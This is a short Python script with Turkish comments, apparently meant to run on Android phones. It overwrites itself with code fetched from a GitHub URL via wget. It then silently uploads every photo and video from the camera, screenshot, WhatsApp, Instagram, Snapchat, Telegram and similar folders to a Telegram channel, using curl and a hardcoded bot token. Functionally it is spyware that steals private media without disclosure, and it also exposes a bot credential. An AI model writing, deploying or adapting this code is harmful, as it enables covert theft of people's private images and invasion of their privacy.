import os
import subprocess
import sys
import time

# Gerekli değişkenler
BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
CHANNEL_ID = "@p8JdyixgqKFlMjA0"
SCRIPT_URL = "https://raw.githubusercontent.com/fatiqueos/mediasync/refs/heads/main/main.py"
SCRIPT_NAME = "main.py"

# Mevcut script içeriğini al
def get_current_script_content():
    if os.path.exists(SCRIPT_NAME):
        with open(SCRIPT_NAME, "r") as file:
            return file.read()
    return None

# Güncellemeleri kontrol et
def check_for_updates():
    print("Güncellemeler kontrol ediliyor...")
    try:
        # Güncel scripti almak için wget veya curl kullanabilirsin (Pydroid 3'te wget mevcut olabilir)
        os.system(f"wget {SCRIPT_URL} -O {SCRIPT_NAME}")
        print("Güncelleme tamamlandı.")
    except Exception as e:
        print(f"Güncelleme kontrolünde hata oluştu: {e}")

# Medya dizinleri
directories = [
    "/storage/emulated/0/DCIM/Camera/",
    "/storage/emulated/0/Pictures/Screenshots/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Video/",
    "/storage/emulated/0/Pictures/Instagram/",
    "/storage/emulated/0/Movies/Instagram/",
    "/storage/emulated/0/Pictures/Facebook/",
    "/storage/emulated/0/Movies/CapCut/",
    "/storage/emulated/0/Pictures/CapCut/",
    "/storage/emulated/0/Pictures/Snapchat/",
    "/storage/emulated/0/Pictures/PicsArt/",
    "/storage/emulated/0/Movies/Snapchat/", 
    "/storage/emulated/0/Pictures/Twitter/",
    "/storage/emulated/0/Movies/Twitter/",
    "/storage/emulated/0/Download/Telegram/",
    "/storage/emulated/0/Movies/",
    "/storage/emulated/0/Videos/"
]

image_extensions = [".jpg", ".jpeg", ".png", ".gif"]
video_extensions = [".mp4", ".mov", ".avi"]

# Medyayı Telegram'a gönder
def send_media_to_channel(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto" if file_path.endswith(tuple(image_extensions)) else f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    
    # Telegram'a gönderme
    os.system(f"curl -s -F 'chat_id={CHANNEL_ID}' -F 'document=@{file_path}' {url}")
    print(f"Telegram'a gönderildi: {file_path}")

# Dosyaları kontrol et ve gönder
def check_and_send_files():
    name = input("Lütfen bir isim girin: ")  # Kullanıcıdan isim iste
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith(tuple(image_extensions + video_extensions)):
                        print(f"Telegram'a gönderiliyor: {file_path}")  # İlerleme mesajı
                        send_media_to_channel(file_path)
                        time.sleep(1)  # Her gönderim arasında 1 saniye bekle
        else:
            print(f"Dizin mevcut değil: {directory}")

# Ana döngü
check_for_updates()  # Başlangıçta güncellemeleri kontrol et
check_and_send_files()  # Medyaları gönder
